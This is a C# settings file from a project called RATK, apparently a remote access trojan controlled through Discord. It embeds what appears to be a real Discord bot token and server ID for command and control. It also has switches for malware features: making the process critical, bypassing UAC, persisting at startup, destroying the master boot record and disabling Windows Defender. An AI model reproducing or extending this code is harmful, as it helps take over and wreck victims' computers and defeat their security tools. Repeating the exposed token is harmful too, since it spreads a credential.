using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace RATK
{
    internal class Settings
    {
        public static string BotToken = "MTMxNjg1MjEyMzQ3MTk3NDQ5Mg.Gqtn26.ViLcf-IB1UrBwGv0nbvJA_TvpBFeNo_rzvNgR0";
        public static ulong ServerId = 1315868730529419284;
        public static string RoleName = "Troll";

        public static bool AutoCriticalProcess = false;
        public static bool AutoTryBypassUAC = false;
        public static bool AutoOnStartup = false;
        public static bool AutoDestroyMBR = false;
        public static bool AutoDisableDefender = false;

        public static string RegistryName = "RATK";
    }
    internal class RuntimeSettings
    {
        public static bool IsCriticalProcess = false;
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
